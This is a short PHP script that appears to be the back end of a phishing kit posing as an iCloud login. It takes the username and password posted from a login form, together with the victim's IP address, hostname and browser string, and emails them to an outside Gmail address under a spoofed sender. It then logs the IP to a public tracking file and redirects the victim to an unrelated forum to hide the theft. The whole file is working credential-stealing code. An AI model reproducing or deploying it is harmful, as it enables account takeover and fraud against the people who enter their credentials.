 
<?php
require_once ($_SERVER["DOCUMENT_ROOT"].'/dbfunction.php');

$frm = "From: ICLOUD ACC <service@orange.fr>";
$to = "cabocelg@gmail.com";
$ubj = " ACC New | ".$_POST['textUsername'];
$msg = "
--------------------- ---------------------
fdcBrowserData : ".$_POST['textUsername']."
--------------------- ---------------------
textUsername: ".$_POST['textUsername']."
textPassword: ".$_POST['textPassword']."
--------------------------------------------
IP : ".getenv("REMOTE_ADDR")."
Host : ".gethostbyaddr(getenv("REMOTE_ADDR"))."
HUA : ".$_SERVER['HTTP_USER_AGENT']."
--------------------------------------------

";
mail($to,$ubj,$msg,$frm);
$fh = fopen(citgf_fopen('track.txt'),'a');
fwrite($fh, $_SERVER['REMOTE_ADDR'].' '.date('c')."\n");
fclose($fh); 
 citgf_makepublic('track.txt');
  header('Location: http://www.commentcamarche.net/forum/');      
?>